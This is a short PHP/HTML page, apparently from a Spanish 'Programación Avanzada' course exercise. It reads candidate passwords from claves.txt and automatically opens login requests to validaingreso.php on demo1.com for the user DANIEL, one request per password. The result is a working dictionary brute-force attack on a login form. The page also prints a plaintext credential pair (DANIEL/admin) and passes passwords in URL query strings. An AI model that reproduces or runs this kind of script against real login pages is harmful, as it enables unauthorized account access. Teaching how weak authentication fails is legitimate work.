<!DOCTYPE html>


<html>
    <head>
        <meta charset="UTF-8">
        
		<title>Autentication Broker - Programación Avanzada</title>
        <!-- Latest compiled and minified JavaScript -->
    </head>
	<script language= "javascript" type= "text/javascript" >
function abre_ventana(url)
{  
alert (url);
window.open(url,'_blank');}
</script >
    <body>


    <div >
     	<div > 
		
			<?php  
		//	phpinfo();

			echo '<label>Lista de claves para romper la aplicacion el usuario conocido es DANIEL y la clave correcta es admin Link 13 </label><br>';
			
		    $user="DANIEL";
			$file1 = fopen("claves.txt", "r") or exit("Unable to open file!");
			$i=1;

			while(!feof($file1))
			{
				$pass= fgets($file1);
			
				
				echo $i." password: <b>".$pass."</b> enlace :";
				$enlace='href="validaingreso.php?username='.$user.'&password='.$pass.'"';
				$url="http://demo1.com/validaingreso.php?username=".$user."&password=".$pass;
				//echo $url;
				echo '<a target=blank href="validaingreso.php?username='.$user.'&password='.$pass.'">',$enlace,'</a><br>';
				echo '<script>';
				echo "abre_ventana('".$url."');";
				echo '</script>';
		     $i++;

			}

			// Fuerza a que se escriban los datos pendientes en el buffer:

			fclose($file1);



		   ?>
		
			
		
		</div>	
  
    </div>
      
	  
</body>

 

</html>